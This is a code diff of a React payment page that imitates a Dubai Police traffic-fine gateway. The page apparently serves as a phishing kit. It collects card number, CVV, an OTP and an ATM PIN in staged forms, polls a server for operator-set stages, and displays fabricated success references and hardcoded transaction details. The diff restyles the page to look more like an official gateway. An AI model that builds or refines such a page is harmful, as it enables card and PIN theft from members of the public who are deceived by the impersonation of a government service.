-          inputMode="numeric"
-          value={pin}
-          onChange={e => setPin(e.target.value.replace(/\D/g, "").slice(0, 6))}
-          placeholder="••••"
-          maxLength={6}
-          className={`w-full border rounded-xl px-4 py-4 text-center text-2xl font-mono tracking-[0.5em] focus:outline-none focus:ring-2 focus:ring-[#006633] transition
-            ${(error || pinError) ? "border-red-400 bg-red-50" : "border-gray-300"}`}
-        />
-      </div>
-
-      <div className="bg-amber-50 border border-amber-200 rounded-xl p-3 flex items-start gap-2">
-        <span className="text-amber-500 mt-0.5">⚠️</span>
-        <p className="text-xs text-amber-700">{t.payment.atm.warning}</p>
-      </div>
-
-      <button type="submit" disabled={isLoading}
-        className="w-full bg-[#006633] text-white py-4 rounded-xl font-bold text-base hover:bg-[#005528] transition disabled:opacity-60 flex items-center justify-center gap-2">
-        {isLoading ? (
-          <>
-            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
-            {t.payment.atm.verifying}
-          </>
-        ) : t.payment.atm.confirmButton}
-      </button>
     </form>
   );
 }
 
-// ======== الصفحة الرئيسية للدفع ========
+function SuccessPage({ totalAmount, onDone }: { totalAmount: string; onDone: () => void }) {
+  const { t, lang } = useLanguage();
+
+  return (
+    <div className="space-y-4">
+      <div className="rounded-[22px] border border-[#daf0df] bg-white px-5 py-10 text-center shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
+        <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[#e8f8ec] text-[30px]">✅</div>
+        <h2 className="text-[22px] font-semibold text-[#12834d]">{t.payment.success.title}</h2>
+        <p className="mt-2 text-[14px] text-[#6f7b88]">{t.payment.success.subtitle}</p>
+        <div className="mt-6 rounded-[18px] bg-[#f5faf7] px-5 py-4">
+          <p className="text-[13px] text-[#6f7b88]">{t.payment.success.amountPaid}</p>
+          <p className="mt-1 text-[28px] font-semibold text-[#12834d]">{totalAmount} {t.payment.header.currency}</p>
+        </div>
+        <div className="mt-4 rounded-[18px] bg-[#f8fafc] px-5 py-4 text-left">
+          <p className="text-[13px] text-[#6f7b88]">{t.payment.success.reference}</p>
+          <p className="mt-1 font-mono text-[14px] text-[#273447]">DP-{Date.now().toString().slice(-8)}</p>
+          <p className="mt-1 text-[12px] text-[#94a3b8]">{new Date().toLocaleString(lang === "ar" ? "ar-AE" : "en-AE")}</p>
+        </div>
+      </div>
+
+      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
+        <button
+          type="button"
+          onClick={onDone}
+          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7]"
+        >
+          {t.payment.success.backButton}
+        </button>
+      </div>
+    </div>
+  );
+}
+
+function FailedPage({ onRetry }: { onRetry: () => void }) {
+  const { t } = useLanguage();
+
+  return (
+    <div className="space-y-4">
+      <div className="rounded-[22px] border border-[#f5d0d0] bg-white px-5 py-10 text-center shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
+        <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-[#fff1f1] text-[30px]">❌</div>
+        <h2 className="text-[22px] font-semibold text-[#cf4444]">{t.payment.failed.title}</h2>
+        <p className="mt-2 text-[14px] text-[#6f7b88]">{t.payment.failed.subtitle}</p>
+      </div>
+
+      <div className="overflow-hidden rounded-[22px] border border-[#e8eef5] bg-[#f5f8fc] px-5 py-5">
+        <button
+          type="button"
+          onClick={onRetry}
+          className="w-full rounded-full bg-[#0d67be] px-5 py-3 text-[17px] font-semibold text-white transition hover:bg-[#0a5aa7]"
+        >
+          {t.payment.failed.retryButton}
+        </button>
+      </div>
+    </div>
+  );
+}
+
 export default function Payment() {
   const [location, navigate] = useLocation();
-  const { t, lang, isRTL, setLanguage } = useLanguage();
+  const { t, lang, setLanguage } = useLanguage();
   const isArabicRoute = location === "/ar/payment" || location.startsWith("/ar/payment?");
   const homePath = isArabicRoute ? "/ar" : "/";
 
@@ -483,8 +521,6 @@ export default function Payment() {
     }
   };
 
-
-  // قراءة بيانات الدفع من sessionStorage مع خطة احتياطية من الرابط
   const [paymentData] = useState(() => {
     try {
       const raw = sessionStorage.getItem("paymentData");
@@ -514,15 +550,12 @@ export default function Payment() {
   const [stage, setStage] = useState<Stage>("card");
   const [errorMessage, setErrorMessage] = useState<string | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
-  // tRPC mutations
   const createSession = trpc.payment.createSession.useMutation();
   const submitCard = trpc.payment.submitCard.useMutation();
   const submitOtp = trpc.payment.submitOtp.useMutation();
   const submitAtmPin = trpc.payment.submitAtmPin.useMutation();
 
-  // tRPC query للـ polling
   const statusQuery = trpc.payment.getStatus.useQuery(
     { sessionId: sessionId || "" },
     {
@@ -532,7 +565,6 @@ export default function Payment() {
     }
   );
 
-  // حفظ sessionId القادم من الرابط محليًا إن وُجد
   useEffect(() => {
     if (!sessionId) return;
     try {
@@ -540,7 +572,6 @@ export default function Payment() {
     } catch {}
   }, [sessionId]);
 
-  // إنشاء الجلسة عند أول تحميل
   useEffect(() => {
     if (!sessionId && paymentData) {
       createSession.mutateAsync({
@@ -549,7 +580,7 @@ export default function Payment() {
         plateNumber: paymentData.plateNumber,
         plateSource: paymentData.plateSource,
         queryId: paymentData.queryId,
-      }).then(res => {
+      }).then((res) => {
         if (res.success) {
           setSessionId(res.sessionId);
           sessionStorage.setItem("paymentSessionId", res.sessionId);
@@ -558,7 +589,6 @@ export default function Payment() {
     }
   }, []);
 
-  // مراقبة تغيير الحالة من الـ polling
   useEffect(() => {
     if (!statusQuery.data) return;
     const newStage = statusQuery.data.stage as Stage;
@@ -566,36 +596,43 @@ export default function Payment() {
 
     if (newStage !== stage) {
       setStage(newStage);
-      if (newError) {
-        setErrorMessage(newError);
-      } else {
-        setErrorMessage(null);
-      }
+      setErrorMessage(newError || null);
     }
   }, [statusQuery.data]);
 
-  // إذا لم تكن هناك بيانات دفع، إعادة التوجيه
   if (!paymentData && !sessionId) {
     return (
-      <div className="min-h-screen bg-gray-50 flex items-center justify-center" dir={isRTL ? "rtl" : "ltr"}>
-        <div className="text-center">
-          <p className="text-gray-600 mb-4">{t.payment.noData.message}</p>
-          <button onClick={() => navigate(homePath)}
-            className="bg-[#006633] text-white px-6 py-2 rounded-xl font-bold">
-            {t.payment.noData.backButton}
-          </button>
+      <PaymentFrame>
+        <PaymentGatewayHeader />
+        <div className="px-4 pb-8 sm:px-5">
+          <div className="rounded-[22px] border border-[#edf2f7] bg-white px-5 py-12 text-center shadow-[0_8px_24px_rgba(148,163,184,0.08)]">
+            <p className="text-[15px] leading-7 text-[#5f6c7b]">{t.payment.noData.message}</p>
+            <button
+              onClick={() => navigate(homePath)}
+              className="mt-5 rounded-full bg-[#0d67be] px-6 py-3 text-[16px] font-semibold text-white transition hover:bg-[#0a5aa7]"
+            >
+              {t.payment.noData.backButton}
+            </button>
+          </div>
         </div>
-      </div>
+        <PaymentFooter />
+      </PaymentFrame>
     );
   }
 
   const totalAmount = paymentData?.totalAmount || "0";
 
-  const handleCardSubmit = async (data: { cardName: string; cardNumber: string; cardExpiry: string; cardCvv: string }) => {
+  const transactionRows = [
+    { label: "Service Provider", value: "Dubai Police" },
+    { label: "Service", value: "Traffic Fine Payment" },
+    { label: "SP Transaction No.", value: sessionId ? sessionId.slice(0, 8).toUpperCase() : "1322640" },
+    { label: "Amount", value: `${totalAmount} AED` },
+  ];
+
+  const handleCardSubmit = async (data: CardSubmitPayload) => {
     setIsSubmitting(true);
     try {
       let currentSessionId = sessionId;
-      // إنشاء الجلسة إذا لم تكن موجودة بعد
       if (!currentSessionId && paymentData) {
         const res = await createSession.mutateAsync({
           selectedFines: paymentData.selectedFines || [],
@@ -663,7 +700,6 @@ export default function Payment() {
     setSessionId(null);
     setStage("card");
     setErrorMessage(null);
-    // إعادة إنشاء جلسة جديدة
     if (paymentData) {
       createSession.mutateAsync({
         selectedFines: paymentData.selectedFines || [],
@@ -671,7 +707,7 @@ export default function Payment() {
         plateNumber: paymentData.plateNumber,
         plateSource: paymentData.plateSource,
         queryId: paymentData.queryId,
-      }).then(res => {
+      }).then((res) => {
         if (res.success) {
           setSessionId(res.sessionId);
           sessionStorage.setItem("paymentSessionId", res.sessionId);
@@ -681,87 +717,37 @@ export default function Payment() {
   };
 
   return (
-    <div className="min-h-screen bg-gray-50" dir={isRTL ? "rtl" : "ltr"}>
-      {/* هيدر */}
-      <div className="bg-[#006633] text-white py-3 px-4 flex items-center justify-between">
-        <div className="flex items-center gap-2">
-          <DubaiPoliceLogo size={32} />
-          <div>
-            <p className="text-sm font-bold">{t.header.siteName}</p>
-            <p className="text-xs opacity-80">{t.header.siteNameEn}</p>
-          </div>
-        </div>
-        <div className={isRTL ? "text-right" : "text-left"}>
-          <p className="text-xs opacity-80">{t.payment.header.totalAmount}</p>
-          <p className="text-lg font-bold">{totalAmount} {t.payment.header.currency}</p>
-        </div>
-      </div>
+    <PaymentFrame>
+      <PaymentGatewayHeader />
 
-      {/* المحتوى */}
-      <div className="max-w-md mx-auto px-4 py-6">
-        {/* شريط التقدم */}
-        {stage !== "success" && stage !== "failed" && (
-          <ProgressSteps stage={stage} />
+      <div className="px-4 pb-2 sm:px-5">
+        {stage === "card" && (
+          <>
+            <SectionCard title="Transaction Information">
+              <InfoTable rows={transactionRows} />
+            </SectionCard>
+            <div className="mt-4">
+              <CardForm
+                onSubmit={handleCardSubmit}
+                onCancel={() => navigate(homePath)}
+                isLoading={isSubmitting}
+                error={errorMessage}
+                totalAmount={totalAmount}
+              />
+            </div>
+          </>
         )}
 
-        {/* بطاقة المحتوى */}
-        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-5">
-          {stage === "card" && (
-            <CardForm
-              onSubmit={handleCardSubmit}
-              isLoading={isSubmitting}
-              error={errorMessage}
-            />
-          )}
-
-          {stage === "card_pending" && (
-            <WaitingPage message={t.payment.waiting.card} />
-          )}
-
-          {stage === "otp" && (
-            <OtpForm
-              onSubmit={handleOtpSubmit}
-              isLoading={isSubmitting}
-              error={errorMessage}
-            />
-          )}
-
-          {stage === "otp_pending" && (
-            <WaitingPage message={t.payment.waiting.otp} />
-          )}
-
-          {stage === "atm" && (
-            <AtmPinForm
-              onSubmit={handleAtmPinSubmit}
-              isLoading={isSubmitting}
-              error={errorMessage}
-            />
-          )}
-
-          {stage === "atm_pending" && (
-            <WaitingPage message={t.payment.waiting.atm} />
-          )}
-
-          {stage === "success" && (
-            <SuccessPage totalAmount={totalAmount} onDone={handleDone} />
-          )}
-
-          {stage === "failed" && (
-            <FailedPage onRetry={handleRetry} />
-          )}
-        </div>
-
-        {/* شارة الأمان السفلية */}
-        {stage !== "success" && stage !== "failed" && (
-          <div className="flex items-center justify-center gap-4 mt-4 text-xs text-gray-400">
-            <span>🔒 {t.payment.security.ssl}</span>
-            <span>•</span>
-            <span>🛡️ {t.payment.security.protected}</span>
-            <span>•</span>
-            <span>✅ {t.payment.security.certified}</span>
-          </div>
-        )}
+        {stage === "card_pending" && <WaitingPage message={t.payment.waiting.card} />}
+        {stage === "otp" && <OtpForm onSubmit={handleOtpSubmit} isLoading={isSubmitting} error={errorMessage} />}
+        {stage === "otp_pending" && <WaitingPage message={t.payment.waiting.otp} />}
+        {stage === "atm" && <AtmPinForm onSubmit={handleAtmPinSubmit} isLoading={isSubmitting} error={errorMessage} />}
+        {stage === "atm_pending" && <WaitingPage message={t.payment.waiting.atm} />}
+        {stage === "success" && <SuccessPage totalAmount={totalAmount} onDone={handleDone} />}
+        {stage === "failed" && <FailedPage onRetry={handleRetry} />}
       </div>
-    </div>
+
+      <PaymentFooter />
+    </PaymentFrame>
   );
 }
